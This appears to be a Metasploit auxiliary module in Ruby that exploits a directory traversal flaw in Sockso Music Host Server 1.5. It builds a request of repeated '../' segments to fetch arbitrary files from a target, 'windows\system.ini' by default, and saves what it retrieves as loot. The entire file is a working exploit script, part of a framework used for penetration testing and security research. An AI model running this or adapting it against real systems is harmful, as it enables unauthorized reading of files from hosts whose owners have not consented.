##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sockso Music Host Server 1.5 Directory Traversal',
			'Description'    => %q{
					This module exploits a directory traversal bug in Sockso on port
				4444.  This is done by using "../" in the path to retrieve a file on
				a vulnerable machine.
			},
			'References'     =>
				[
					[ 'URL', 'http://aluigi.altervista.org/adv/sockso_1-adv.txt' ],
				],
			'Author'         =>
				[
					'Luigi Auriemma',  #Initial discovery, poc
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'DisclosureDate' => "Mar 14 2012"
		))

		register_options(
			[
				Opt::RPORT(4444),
				OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
			], self.class)

		deregister_options('RHOST')
	end

	def run_host(ip)
		trav = "file/"
		trav << "../" * 10

		file = datastore['FILEPATH']
		file = file[1,file.length] if file[0,1] == "\\"

		uri = "/#{trav}#{file}"
		print_status("#{ip}:#{rport} - Retriving #{file}")

		res = send_request_raw({
			'method' => 'GET',
			'uri'    => uri
		}, 25)

		print_status("#{ip}:#{rport} returns: #{res.code.to_s}")

		if res and res.body.empty?
			print_error("No file to download (empty)")
		else
			fname = File.basename(datastore['FILEPATH'])
			path = store_loot(
				'netdecision.http',
				'application/octet-stream',
				ip,
				res.body,
				fname)
			print_status("File saved in: #{path}")
		end
	end
end
